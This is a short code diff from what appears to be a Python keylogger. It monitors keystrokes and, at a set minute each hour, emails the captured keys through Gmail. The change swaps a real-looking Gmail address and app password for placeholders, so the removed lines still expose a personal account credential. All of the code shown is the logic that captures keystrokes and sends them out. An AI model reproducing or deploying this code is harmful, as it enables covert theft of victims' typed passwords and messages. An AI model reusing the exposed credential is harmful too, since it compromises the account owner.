@@ -8,8 +8,8 @@ keyboard.mon_key()
 
 while True:
     if dt.now().minute == time:
-        email = Email("sakakibarav5555@gmail.com","zcph gupb aogo zgub",
-                      "sakakibarav5555@gmail.com",keyboard.get_keys())
+        email = Email("sender@gmail.com","senha",
+                      "receiver@gmail.com",keyboard.get_keys())
         
         email.enviar_email()
         
